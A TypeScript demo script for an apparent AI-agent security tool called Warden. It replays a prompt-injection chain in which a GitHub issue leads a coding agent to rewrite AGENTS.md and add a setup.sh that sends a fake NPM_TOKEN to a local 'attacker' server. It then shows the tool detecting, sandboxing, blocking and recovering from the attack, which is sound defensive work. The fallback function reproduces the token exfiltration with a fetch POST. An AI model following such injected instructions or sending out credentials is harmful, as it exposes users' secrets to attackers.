import assert from "node:assert/strict";
import { spawn, type ChildProcess } from "node:child_process";
import { EventEmitter } from "node:events";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import { tmpdir } from "node:os";
import path from "node:path";
import process from "node:process";
import { createInterface } from "node:readline/promises";
import { fileURLToPath, pathToFileURL } from "node:url";
import { Engine } from "../src/core/engine.js";
import { runHook, type EngineFactory, type HookHost } from "../src/hooks/run.js";
import { guardrails } from "../src/policy/guardrails.js";
import { RiskScorer } from "../src/policy/risk.js";
import { MockKeyProvider } from "../src/responder/providers.js";
import { respondDeterministically } from "../src/responder/runbook.js";
import { WardenStore } from "../src/store/database.js";
import { MemorySecretStore, SecretVault } from "../src/vault/secrets.js";
import { startDashboard, type DashboardServer } from "../src/dashboard/server.js";

const FAKE_TOKEN = "npm_demo_FAKE_TOKEN_not_real_12345";
const colors = {
  reset: "\u001b[0m",
  dim: "\u001b[2m",
  red: "\u001b[31m",
  green: "\u001b[32m",
  yellow: "\u001b[33m",
  cyan: "\u001b[36m",
  magenta: "\u001b[35m",
};

interface ReplayStep {
  id: string;
  host: HookHost;
  event: string;
  payload: Record<string, unknown>;
}

interface ReplayFile {
  issue: { number: number; title: string; body: string };
  files: { agentsBefore: string; agentsAfter: string; setup: string };
  steps: ReplayStep[];
}

export interface DemoResult {
  dashboard?: DashboardServer;
  unprotectedReceipts: string[];
  protectedReceipts: string[];
  replayFile: string;
  trace: string[];
  riskBackends: string[];
  recovery: {
    exposedKeys: string[];
    rotationCount: number;
    oldRejected: boolean;
    agentsRestored: boolean;
    setupQuarantined: boolean;
    closed: boolean;
    reportPath: string;
    report: string;
  };
  /** Kept on successful presenter runs so the reported incident can be inspected. */
  protectedRoot: string;
}

export interface DemoOptions {
  step?: boolean;
  dashboard?: boolean;
  lineDelayMs?: number;
  pause?: (message: string) => Promise<void>;
  onDashboardReady?: (server: DashboardServer, root: string) => Promise<void> | void;
  color?: boolean;
  print?: (line: string) => void;
  /** Tests opt in to removing the otherwise inspectable incident and quarantine. */
  cleanup?: boolean;
  /** Test-only way to verify the Git-Bash-free fallback on every platform. */
  forceNodeFallback?: boolean;
}

export async function runDemo(options: DemoOptions = {}): Promise<DemoResult> {
  const useColor = options.color ?? process.stdout.isTTY;
  const print = options.print ?? console.log;
  const trace: string[] = [];
  let riskBudget = 0;
  let riskSession = "";
  const pause = options.pause ?? waitForEnter;
  const say = async (status: string, color: keyof typeof colors, actor: string, action: string, detail: string) => {
    const label = status.toUpperCase().padEnd(10);
    const budget = riskSession ? `R[${riskSession}]=${riskBudget.toFixed(2)}` : "";
    const plain = `${label} ${actor.padEnd(10)} ${action.padEnd(32)} ${budget.padEnd(16)} ${detail}`;
    trace.push(plain);
    print(useColor ? `${colors[color]}${label}${colors.reset} ${colors.cyan}${actor.padEnd(10)}${colors.reset} ${action.padEnd(32)} ${budget.padEnd(16)} ${colors.dim}${detail}${colors.reset}` : plain);
    if (options.lineDelayMs) await delay(options.lineDelayMs);
  };
  let completed = false;
  let dashboardServer: DashboardServer | undefined;

  const attacker = await startAttacker();
  const replayFile = fileURLToPath(new URL("./replay-actions.json", import.meta.url));
  const template = JSON.parse(readFileSync(replayFile, "utf8")) as ReplayFile;
  const unsafeRoot = mkdtempSync(path.join(tmpdir(), "warden-demo-unsafe-"));
  const protectedRoot = mkdtempSync(path.join(tmpdir(), "warden-demo-protected-"));

  try {
    if (options.step) await pause("Press Enter to start Part 1: the unprotected attack.");
    print("\n=== PART 1 — WITHOUT WARDEN ===");
    const unsafe = resolveReplay(template, unsafeRoot, attacker.url);
    setupRepository(unsafeRoot, unsafe, false);
    const build = await runProcess(npmCommand(), ["run", "build"], unsafeRoot);
    assert.notEqual(build.code, 0, "The demo repository build must fail before the attack chain.");
    await say("FAIL", "yellow", "NODE", "npm run build", "expected failing build");
    await say("ALLOW", "green", "CURSOR", "read GitHub issue #42", "unprotected external input");
    writeFileSync(path.join(unsafeRoot, "AGENTS.md"), unsafe.files.agentsAfter, "utf8");
    await say("ALLOW", "green", "CURSOR", "write AGENTS.md", "persistent instruction added");
    mkdirSync(path.join(unsafeRoot, "scripts"), { recursive: true });
    writeFileSync(path.join(unsafeRoot, "scripts", "setup.sh"), unsafe.files.setup, "utf8");
    chmodSync(path.join(unsafeRoot, "scripts", "setup.sh"), 0o755);
    await say("ALLOW", "green", "CURSOR", "write scripts/setup.sh", "exfiltration script added");
    await say("ALLOW", "green", "CLINE", "read AGENTS.md", "trusted persistent instruction");
    const attack = await runShellScript(unsafeRoot, attacker.url, options.forceNodeFallback ?? false);
    assert.equal(attack.code, 0, `Unprotected setup script failed: ${attack.stderr}`);
    await attacker.waitForCount(1);
    assert.equal(attacker.receipts[0], FAKE_TOKEN, "Part 1 must prove the fake token reached the attacker.");
    await say("LEAK", "red", "CLINE", "exec scripts/setup.sh", `LEAKED ${attacker.receipts[0]}`);
    const unprotectedReceipts = [...attacker.receipts];

    attacker.reset();
    if (options.step) await pause("Press Enter for Part 2: Warden protection.");
    print("\n=== PART 2 — WITH WARDEN ===");
    const protectedReplay = resolveReplay(template, protectedRoot, attacker.url);
    setupRepository(protectedRoot, protectedReplay, true);
    const demo = createDemoEngine(protectedRoot);
    demo.seedEnv();
    if (options.dashboard) {
      dashboardServer = await startDashboard(protectedRoot);
      print(`Live demo dashboard: ${dashboardServer.url}`);
      print("Fake demo credentials only; recovery uses a mock rotation provider.");
      await options.onDashboardReady?.(dashboardServer, protectedRoot);
    }
    riskSession = "cursor";
    const steps = new Map(protectedReplay.steps.map((step) => [step.id, step]));

    await replayHook(steps.get("cursor-intent")!, protectedRoot, demo.normal);
    await replayHook(steps.get("cursor-issue")!, protectedRoot, demo.normal);
    let decision = latestDecision(demo.dbPath);
    riskBudget = decision.budget;
    assert.ok(decision.labels.includes("trust:injection-attempt"));
    demo.verifyBackend(decision.backend);
    await say("FLAG", "magenta", "CURSOR", "read GitHub issue #42", "injection detected; session tainted");

    let output;
    if (dashboardServer) {
      await say("HOLD", "yellow", "CURSOR", "write AGENTS.md", "human approval required");
      await pause("Open the dashboard. Press Enter when ready, then click Allow within 20 seconds.");
      print("Waiting for the dashboard Allow click on AGENTS.md…");
      output = await replayHook(steps.get("cursor-agents")!, protectedRoot, demo.normal);
      decision = latestDecision(demo.dbPath);
      assert.equal(JSON.parse(output.stdout).permission, "allow", "AGENTS.md was denied or expired; rerun and click Allow within 20 seconds.");
      assert.ok(decision.labels.includes("approval:approved"));
      await say("APPROVE", "cyan", "USER", "approve AGENTS.md", "approved in live dashboard");
    } else {
      output = await replayHook(steps.get("cursor-agents")!, protectedRoot, demo.normal);
      decision = latestDecision(demo.dbPath);
      riskBudget = decision.budget;
      demo.verifyBackend(decision.backend);
      assert.equal(decision.verdict, "block");
      assert.ok(decision.labels.includes("approval:denied"));
      assert.equal(JSON.parse(output.stdout).permission, "deny");
      await say("HOLD", "yellow", "CURSOR", "write AGENTS.md", "control-file approval required");

      await say("REPLAY", "cyan", "DEMO", "approve AGENTS.md", "simulated approval; use --dashboard");
      output = await replayHook(steps.get("cursor-agents")!, protectedRoot, demo.approvedControlWrite);
      decision = latestDecision(demo.dbPath);
    }
    riskBudget = decision.budget;
    demo.verifyBackend(decision.backend);
    assert.equal(JSON.parse(output.stdout).permission, "allow");
    writeFileSync(path.join(protectedRoot, "AGENTS.md"), protectedReplay.files.agentsAfter, "utf8");
    await say("ALLOW", "green", "CURSOR", "write AGENTS.md", "approved; tainted snapshot recorded");

    output = await replayHook(steps.get("cursor-setup")!, protectedRoot, dashboardServer ? demo.normal : demo.approvedControlWrite);
    decision = latestDecision(demo.dbPath);
    riskBudget = decision.budget;
    demo.verifyBackend(decision.backend);
    assert.equal(JSON.parse(output.stdout).permission, "allow");
    mkdirSync(path.join(protectedRoot, "scripts"), { recursive: true });
    writeFileSync(path.join(protectedRoot, "scripts", "setup.sh"), protectedReplay.files.setup, "utf8");
    chmodSync(path.join(protectedRoot, "scripts", "setup.sh"), 0o755);
    await say("ALLOW", "green", "CURSOR", "write scripts/setup.sh", "tainted file recorded");

    await replayHook(steps.get("cline-intent")!, protectedRoot, demo.normal);
    riskSession = "cline";
    output = await replayHook(steps.get("cline-vault-whoami")!, protectedRoot, demo.normal);
    decision = latestDecision(demo.dbPath);
    riskBudget = decision.budget;
    demo.verifyBackend(decision.backend);
    assert.equal(JSON.parse(output.stdout).cancel, false, "The scoped vault command must be allowed before the tainted read.");
    assert.ok(decision.labels.includes("vault:run-ticket"), "The hook must issue a command-bound vault ticket.");
    const reachedKey = demo.consumeWhoamiTicket();
    assert.equal(reachedKey, FAKE_TOKEN, "The mock child must receive the fake key through the real ticket path.");
    await say("ALLOW", "green", "CLINE", "warden run npm whoami", "scoped NPM_TOKEN reached mock child");
    await replayHook(steps.get("cline-agents-read")!, protectedRoot, demo.normal);
    decision = latestDecision(demo.dbPath);
    riskBudget = decision.budget;
    assert.ok(decision.labels.includes("trust:untrusted"));
    await say("FLAG", "magenta", "CLINE", "read AGENTS.md", "cross-agent taint inherited");

    output = await replayHook(steps.get("cline-setup-exec")!, protectedRoot, demo.normal);
    decision = latestDecision(demo.dbPath);
    riskBudget = decision.budget;
    const sandbox = latestSandbox(demo.dbPath);
    assert.equal(decision.verdict, "block");
    assert.equal(JSON.parse(output.stdout).cancel, true);
    assert.ok(sandbox, "A real sandbox ledger row must be recorded.");
    await say("SANDBOX", "yellow", "WARDEN", "shadow-run scripts/setup.sh", `${sandbox.backend} saw secret/network behavior`);
    await say("BLOCK", "red", "WARDEN", "block real execution", "tainted setup.sh; network + secret risk");

    await delay(150);
    assert.deepEqual(attacker.receipts, [], `WARDEN FAILURE: attacker received ${JSON.stringify(attacker.receipts)}`);
    await say("SAFE", "green", "ATTACKER", "received requests", "0 — nothing left the protected repo");

    if (options.step) await pause("Press Enter for Part 3: deterministic recovery with a mock key provider.");
    print("\n=== PART 3 — DETERMINISTIC RECOVERY (MOCK KEY PROVIDER) ===");
    const store = new WardenStore(demo.dbPath);
    const npm = new MockKeyProvider("npm", /NPM_TOKEN/);
    let response: Awaited<ReturnType<typeof respondDeterministically>>;
    try {
      response = await respondDeterministically({ workspaceRoot: protectedRoot, database: store.database,
        sessionId: "cline-day-2", trigger: "sandbox blocked tainted setup.sh", providers: [npm] });
    } finally { store.close(); }
    assert.deepEqual(response.investigation.exposedKeys, ["NPM_TOKEN"]);
    const rotation = response.rotations.find((item) => item.keyName === "NPM_TOKEN");
    assert.ok(rotation?.oldRejected && rotation.status === "rotated");
    assert.equal(npm.rotationCount("NPM_TOKEN"), 1);
    const agentsRestored = readFileSync(path.join(protectedRoot, "AGENTS.md"), "utf8") === protectedReplay.files.agentsBefore;
    const setup = response.files.find((item) => item.path === "scripts/setup.sh");
    const setupQuarantined = setup?.status === "quarantined" && !!setup.destination
      && existsSync(path.join(protectedRoot, setup.destination)) && !existsSync(path.join(protectedRoot, "scripts", "setup.sh"));
    assert.ok(agentsRestored, "AGENTS.md must be restored to its first pre-attack snapshot.");
    assert.ok(setupQuarantined, "The attacker-created script must move to quarantine.");
    assert.equal(response.closed, true, "The deterministic response should fully close this incident.");
    const reportPath = path.join(protectedRoot, response.reportPath);
    const report = readFileSync(reportPath, "utf8");
    await say("FIND", "magenta", "RESPONDER", "recorded key grants", "1: NPM_TOKEN (fake demo key)");
    await say("ROTATE", "cyan", "RESPONDER", "NPM_TOKEN", "mock key rotated; old key rejected");
    await say("RESTORE", "green", "RESPONDER", "AGENTS.md", "original pre-attack content");
    await say("QUARANTINE", "yellow", "RESPONDER", "scripts/setup.sh", "attacker-created script isolated");
    await say("CLOSED", "green", "RESPONDER", "incident", "all recovery checks passed");
    print(`Incident report: ${reportPath}`);
    completed = true;

    return {
      unprotectedReceipts,
      protectedReceipts: [...attacker.receipts],
      replayFile,
      trace,
      riskBackends: demo.backends(),
      protectedRoot,
      ...(dashboardServer ? { dashboard: dashboardServer } : {}),
      recovery: { exposedKeys: response.investigation.exposedKeys, rotationCount: npm.rotationCount("NPM_TOKEN"),
        oldRejected: rotation.oldRejected, agentsRestored, setupQuarantined: !!setupQuarantined,
        closed: response.closed, reportPath, report },
    };
  } finally {
    if (dashboardServer && (!completed || options.cleanup)) await dashboardServer.close();
    await attacker.close();
    rmSync(unsafeRoot, { recursive: true, force: true });
    if (!completed || options.cleanup) rmSync(protectedRoot, { recursive: true, force: true });
  }
}

function createDemoEngine(root: string): {
  dbPath: string;
  normal: EngineFactory;
  approvedControlWrite: EngineFactory;
  seedEnv(): void;
  consumeWhoamiTicket(): string;
  verifyBackend(backend: string): void;
  backends(): string[];
} {
  const dbPath = path.join(root, ".warden", "warden.db");
  const secrets = new MemorySecretStore();
  const scoringEnvironment: NodeJS.ProcessEnv = { ...process.env, WARDEN_OLLAMA_URL: "https://disabled.invalid" };
  const cloudflareConfigured = !!scoringEnvironment.CLOUDFLARE_ACCOUNT_ID
    && !!(scoringEnvironment.CLOUDFLARE_API_TOKEN ?? scoringEnvironment.CLOUDFLARE_AUTH_TOKEN ?? scoringEnvironment.CLOUDFLARE_API_KEY);
  const requireCloudflare = scoringEnvironment.WARDEN_RISK_OFFLINE !== "1" && cloudflareConfigured;
  const configuredTimeout = Number(scoringEnvironment.WARDEN_DEMO_CLEF_TIMEOUT_MS ?? "10000");
  const riskScorer = new RiskScorer({ env: scoringEnvironment,
    timeoutMs: Number.isFinite(configuredTimeout) && configuredTimeout > 0 ? configuredTimeout : 10_000 });
  const usedBackends = new Set<string>();
  const factory = (approveControl: boolean): EngineFactory => (workspaceRoot) => {
    const store = new WardenStore(dbPath);
    const vault = new SecretVault(workspaceRoot, store.database, secrets);
    const engine = new Engine(store, {
      workspaceRoot,
      vault,
      ...(approveControl ? { approval: async () => ({ id: null, status: "approved" as const, reason: "Explicit demo-only approval." }) } : {}),
      stages: {
        risk: (action, intent) => riskScorer.score(action, intent, workspaceRoot),
        ...(approveControl ? {
          guardrails: async (action, context) => (await guardrails(action, context)).filter((finding) => finding.label !== "control-file"),
        } : {}),
      },
    });
    return { decide: (action) => engine.decide(action), close: () => store.close() };
  };
  return {
    dbPath,
    normal: factory(false),
    approvedControlWrite: factory(true),
    verifyBackend(backend) {
      if (backend !== "none") usedBackends.add(backend);
      if (requireCloudflare && backend !== "none") assert.equal(backend, "cloudflare",
        `Cloudflare CLEF was configured but the demo recorded ${backend}; increase WARDEN_DEMO_CLEF_TIMEOUT_MS or check the API token.`);
    },
    backends: () => [...usedBackends],
    consumeWhoamiTicket() {
      const store = new WardenStore(dbPath);
      try {
        const vault = new SecretVault(root, store.database, secrets);
        let received: string | undefined;
        const child = vault.runWithTicket("npm", ["whoami"], ["NPM_TOKEN"], (environment) => {
          received = environment.NPM_TOKEN;
          return new EventEmitter() as ChildProcess;
        });
        child.emit("spawn");
        assert.deepEqual(vault.grantedNames("cline-day-2"), ["NPM_TOKEN"]);
        return received ?? "";
      } finally { store.close(); }
    },
    seedEnv() {
      const store = new WardenStore(dbPath);
      try {
        new SecretVault(root, store.database, secrets).seedEnv(".env");
      } finally {
        store.close();
      }
    },
  };
}

async function replayHook(step: ReplayStep, root: string, openEngine: EngineFactory) {
  return runHook({
    host: step.host,
    event: step.event,
    input: JSON.stringify(step.payload),
    cwd: root,
    env: { ...process.env, CURSOR_PROJECT_DIR: root },
    openEngine,
  });
}

function setupRepository(root: string, replay: ReplayFile, protectedRun: boolean): void {
  mkdirSync(path.join(root, "src"), { recursive: true });
  writeFileSync(path.join(root, "package.json"), JSON.stringify({
    name: protectedRun ? "warden-demo-protected" : "warden-demo-unsafe",
    private: true,
    scripts: { build: "node -e \"console.error('demo build failed'); process.exit(1)\"" },
  }, null, 2));
  writeFileSync(path.join(root, "src", "index.js"), "console.log('demo')\n", "utf8");
  writeFileSync(path.join(root, "AGENTS.md"), replay.files.agentsBefore, "utf8");
  writeFileSync(path.join(root, ".env"), `NPM_TOKEN=${FAKE_TOKEN}\n`, "utf8");
  mkdirSync(path.join(root, ".demo"), { recursive: true });
  writeFileSync(path.join(root, ".demo", "issue-42.md"), `# ${replay.issue.title}\n\n${replay.issue.body}\n`, "utf8");
}

function resolveReplay(template: ReplayFile, root: string, attackerUrl: string): ReplayFile {
  const replacements: Record<string, string> = {
    "{{WORKSPACE}}": root,
    "{{ATTACKER_URL}}": attackerUrl,
    "{{ISSUE_BODY}}": template.issue.body.replaceAll("{{ATTACKER_URL}}", attackerUrl),
    "{{AGENTS_AFTER}}": template.files.agentsAfter,
    "{{SETUP_SCRIPT}}": template.files.setup.replaceAll("{{ATTACKER_URL}}", attackerUrl),
  };
  const replace = (value: unknown): unknown => {
    if (typeof value === "string") return Object.entries(replacements).reduce((text, [key, replacement]) => text.replaceAll(key, replacement), value);
    if (Array.isArray(value)) return value.map(replace);
    if (value && typeof value === "object") return Object.fromEntries(Object.entries(value).map(([key, item]) => [key, replace(item)]));
    return value;
  };
  return replace(template) as ReplayFile;
}

function latestDecision(dbPath: string): { verdict: string; reason: string; labels: string[]; budget: number; backend: string } {
  const store = new WardenStore(dbPath);
  try {
    const row = store.database.prepare("SELECT verdict, reason, labels_json, session_budget, risk_backend FROM decisions ORDER BY id DESC LIMIT 1").get();
    if (!row) throw new Error("Demo decision ledger is empty");
    return { verdict: String(row.verdict), reason: String(row.reason), labels: JSON.parse(String(row.labels_json)) as string[],
      budget: Number(row.session_budget), backend: String(row.risk_backend) };
  } finally {
    store.close();
  }
}

function latestSandbox(dbPath: string): { backend: string; verdict: string } | null {
  const store = new WardenStore(dbPath);
  try {
    const row = store.database.prepare("SELECT backend, verdict FROM sandbox_runs ORDER BY id DESC LIMIT 1").get();
    return row ? { backend: String(row.backend), verdict: String(row.verdict) } : null;
  } finally {
    store.close();
  }
}

async function startAttacker(): Promise<{
  url: string;
  receipts: string[];
  reset(): void;
  waitForCount(count: number): Promise<void>;
  close(): Promise<void>;
}> {
  const receipts: string[] = [];
  const server: Server = createServer((request, response) => {
    const chunks: Buffer[] = [];
    request.on("data", (chunk) => chunks.push(Buffer.from(chunk)));
    request.on("end", () => {
      receipts.push(Buffer.concat(chunks).toString("utf8"));
      response.writeHead(204).end();
    });
  });
  await new Promise<void>((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, "127.0.0.1", resolve);
  });
  const address = server.address();
  if (!address || typeof address === "string") throw new Error("Could not start demo attacker server");
  return {
    url: `http://127.0.0.1:${address.port}/collect`,
    receipts,
    reset: () => receipts.splice(0),
    async waitForCount(count: number) {
      const deadline = Date.now() + 3_000;
      while (receipts.length < count && Date.now() < deadline) await delay(20);
      if (receipts.length < count) throw new Error(`Attacker expected ${count} request(s), received ${receipts.length}`);
    },
    close: () => new Promise<void>((resolve, reject) => server.close((error) => error ? reject(error) : resolve())),
  };
}

async function runShellScript(root: string, attackerUrl: string, forceNodeFallback: boolean): Promise<{ code: number; stdout: string; stderr: string }> {
  if (process.platform === "win32") {
    const bash = ["C:\\Program Files\\Git\\bin\\bash.exe", "C:\\Program Files\\Git\\usr\\bin\\bash.exe"].find(existsSync);
    if (bash && !forceNodeFallback) return runProcess(bash, ["scripts/setup.sh"], root);
  }
  if (process.platform !== "win32" && !forceNodeFallback && existsSync("/bin/sh")) return runProcess("/bin/sh", ["scripts/setup.sh"], root);
  // Same observable effect as the demo's shell script, without requiring Git Bash on a judge's Windows laptop.
  const script = readFileSync(path.join(root, "scripts", "setup.sh"), "utf8");
  if (!script.includes(attackerUrl) || !script.includes(". ./.env") || !script.includes('"$NPM_TOKEN"')) {
    return { code: 1, stdout: "", stderr: "Demo script did not match the expected local attack." };
  }
  const token = /^NPM_TOKEN=(.*)$/m.exec(readFileSync(path.join(root, ".env"), "utf8"))?.[1];
  if (token !== FAKE_TOKEN || new URL(attackerUrl).hostname !== "127.0.0.1") {
    return { code: 1, stdout: "", stderr: "Demo fallback requires the fake token and loopback attacker." };
  }
  const response = await fetch(attackerUrl, { method: "POST", headers: { "content-type": "text/plain" }, body: token });
  return { code: response.ok ? 0 : 1, stdout: "", stderr: response.ok ? "" : `Local attacker returned ${response.status}` };
}

function runProcess(command: string, args: string[], cwd: string): Promise<{ code: number; stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const windowsCommand = process.platform === "win32" && /\.(?:cmd|bat)$/i.test(command);
    const executable = windowsCommand ? (process.env.ComSpec ?? "cmd.exe") : command;
    const commandArgs = windowsCommand ? ["/d", "/s", "/c", [command, ...args].map(cmdQuote).join(" ")] : args;
    const child = spawn(executable, commandArgs, {
      cwd,
      env: process.env,
      windowsHide: true,
    });
    let stdout = "";
    let stderr = "";
    child.stdout.setEncoding("utf8").on("data", (chunk) => { stdout += chunk; });
    child.stderr.setEncoding("utf8").on("data", (chunk) => { stderr += chunk; });
    child.once("error", reject);
    child.once("close", (code) => resolve({ code: code ?? 1, stdout, stderr }));
  });
}

function cmdQuote(value: string): string {
  return /[\s"&|<>^]/.test(value) ? `"${value.replaceAll('"', '""')}"` : value;
}

function npmCommand(): string {
  return process.platform === "win32" ? "npm.cmd" : "npm";
}

function delay(milliseconds: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

export function parseDemoArgs(args: readonly string[]): Pick<DemoOptions, "step" | "dashboard" | "lineDelayMs"> {
  const options: Pick<DemoOptions, "step" | "dashboard" | "lineDelayMs"> = {};
  for (let i = 0; i < args.length; i++) {
    if (args[i] === "--step") options.step = true;
    else if (args[i] === "--dashboard") options.dashboard = true;
    else if (args[i] === "--delay") {
      const value = args[++i];
      if (!value || !/^\d+$/.test(value) || Number(value) > 5000) throw new Error("--delay requires milliseconds from 0 to 5000.");
      options.lineDelayMs = Number(value);
    } else throw new Error("Usage: npm run demo -- [--step] [--dashboard] [--delay MILLISECONDS]");
  }
  if (options.step && options.lineDelayMs === undefined) options.lineDelayMs = 400;
  return options;
}

async function waitForEnter(message: string): Promise<void> {
  if (!process.stdin.isTTY) throw new Error("Interactive demo flags require a terminal. Run without --step/--dashboard for unattended playback.");
  const input = createInterface({ input: process.stdin, output: process.stdout });
  try { await input.question(`${message}\n`); } finally { input.close(); }
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  (async () => {
    const options = parseDemoArgs(process.argv.slice(2));
    if ((options.step || options.dashboard) && !process.stdin.isTTY) throw new Error("--step and --dashboard require an interactive terminal.");
    const result = await runDemo(options);
    if (result.dashboard) {
      const close = () => { void result.dashboard!.close().then(() => process.exit(0)); };
      process.once("SIGINT", close);
      process.once("SIGTERM", close);
      try { await waitForEnter(`Dashboard remains live at ${result.dashboard.url} — show the incident and View report. Press Enter to stop.`); }
      finally { process.off("SIGINT", close); process.off("SIGTERM", close); await result.dashboard.close(); }
    }
  })().catch((error: unknown) => {
    console.error(`${colors.red}DEMO FAILED:${colors.reset}`, error);
    process.exitCode = 1;
  });
}